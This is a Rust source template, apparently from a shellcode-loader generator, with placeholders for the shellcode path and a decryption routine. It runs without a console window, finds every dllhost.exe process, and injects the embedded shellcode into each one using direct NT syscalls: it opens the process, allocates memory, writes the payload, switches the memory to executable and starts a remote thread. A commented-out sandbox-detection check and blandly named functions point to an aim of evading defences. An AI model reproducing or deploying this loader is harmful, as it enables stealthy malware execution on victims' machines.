#![windows_subsystem = "windows"]
#[allow(non_snake_case)]

use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use std::include_bytes;
use rust_syscalls::syscall;

use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, GENERIC_ALL},
        lmaccess::{ACCESS_ALL}
    },
    shared::{
        ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS}
    }
};
use winapi::ctypes::c_void;
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
use std::{ptr::null_mut};
use ntapi::ntapi_base::CLIENT_ID;
//use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;
use winapi::shared::ntdef::NULL;

{{IMPORTS}}

{{DECRYPTION_FUNCTION}}

fn boxboxbox(tar: &str) -> Vec<usize> {
    // search for processes to inject into
    let mut dom: Vec<usize> = Vec::new();
    let s = System::new_all();
    for pro in s.processes_by_exact_name(tar) {
        //println!("{} {}", pro.pid(), pro.name());
        dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
    }
    return dom;
}

fn enhance(mut buf: Vec<u8>, tar: usize) {
    // injecting in target processes :)
    let mut process_handle = tar as HANDLE;
    let mut oa = OBJECT_ATTRIBUTES::default();
    let mut ci = CLIENT_ID {
        UniqueProcess: process_handle,
        UniqueThread: null_mut(),
    };

    unsafe {
        let open_status = syscall!("NtOpenProcess", &mut process_handle, ACCESS_ALL, &mut oa, &mut ci);
        if !NT_SUCCESS(open_status) {
            panic!("Error opening process: {}", open_status);
        }
        let mut allocstart : *mut c_void = null_mut();
        let mut size : usize = buf.len();
        let alloc_status = syscall!("NtAllocateVirtualMemory", process_handle, &mut allocstart, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(alloc_status) {
            panic!("Error allocating memory to the target process: {}", alloc_status);
        }
        let mut byteswritten = 0;
        let buffer = buf.as_mut_ptr() as *mut c_void;
        let mut buffer_length = buf.len();
        let write_status = syscall!("NtWriteVirtualMemory", process_handle, allocstart, buffer, buffer_length, &mut byteswritten);
        if !NT_SUCCESS(write_status) {
            panic!("Error writing to the target process: {}", write_status);
        }

        let mut old_perms = PAGE_READWRITE;
        let protect_status = syscall!("NtProtectVirtualMemory", process_handle, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
        if !NT_SUCCESS(protect_status) {
            panic!("[-] Failed to call NtProtectVirtualMemory: {:#x}", protect_status);
        }

        let mut thread_handle : *mut c_void = null_mut();
        let handle = process_handle as *mut c_void;

        let write_thread = syscall!("NtCreateThreadEx", &mut thread_handle, GENERIC_ALL, NULL, handle, allocstart, NULL, 0, NULL, NULL, NULL, NULL);

        if write_status != 0 {
            panic!("Error failed to create remote thread: {:#02X}", write_thread);
        }
    }
}

fn main() {
    // inject in the following processes:
    let tar: &str = "dllhost.exe";

    // Removing the sandobox check for now, as it fails on numerous Windows versions.
    /*
    let mut memory = 0;
    unsafe {
        let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
        println!("{:#?}", is_quicksand);
        if is_quicksand != 1 {
            panic!("Hello.")
        }
    }
    */
    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    let list: Vec<usize> = boxboxbox(tar);
    if list.len() == 0 {
        panic!("[-] Unable to find a process.")
    } else {
        for i in &list {
            {{MAIN}}
            enhance(vec.clone(), *i);
        }
    }
}

{{DLL_MAIN}}